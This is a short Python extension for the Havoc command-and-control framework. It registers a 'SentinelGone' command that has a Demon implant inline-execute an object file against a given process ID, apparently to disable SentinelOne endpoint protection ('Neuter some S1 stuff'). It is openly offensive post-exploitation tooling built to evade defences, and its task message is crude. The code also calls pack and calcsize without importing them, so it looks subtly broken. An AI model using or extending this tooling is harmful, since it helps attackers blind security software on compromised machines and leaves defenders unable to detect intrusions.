from havoc import Demon, RegisterCommand, RegisterModule
from os.path import exists

class Packer:
    def __init__(self):
        self.buffer: bytes = b''
        self.size: int = 0

    def getbuffer(self):
        return pack("<L", self.size) + self.buffer

    def addstr(self, s):
        if s is None:
            s = ''
        if isinstance(s, str):
            s = s.encode("utf-8")
        fmt = "<L{}s".format(len(s) + 1)
        self.buffer += pack(fmt, len(s) + 1, s)
        self.size += calcsize(fmt)

    def addint(self, dint):
        self.buffer += pack("<i", dint)
        self.size += 4

def bof(demon_id, *args):
    
    task_id: str = None
    demon: Demon = None
    packer: Packer = Packer()
    string: str = None
    int32: int = 0

    demon = Demon(demon_id)

    if len(args) < 1:
        demon.ConsoleWrite(demon.CONSOLE_ERROR, "Not enough arguments")
        return False

    packer.addint(int(args[0]))

    task_id = demon.ConsoleWrite(demon.CONSOLE_TASK, "Tasked the demon to fuck shit up")

    demon.InlineExecute(task_id, "go", "/tmp/bof.o", packer.getbuffer(), False)

    return task_id

RegisterCommand(bof, "", "SentinelGone", "Neuter some S1 stuff in a remote process", 0, "<pid>", "1234")
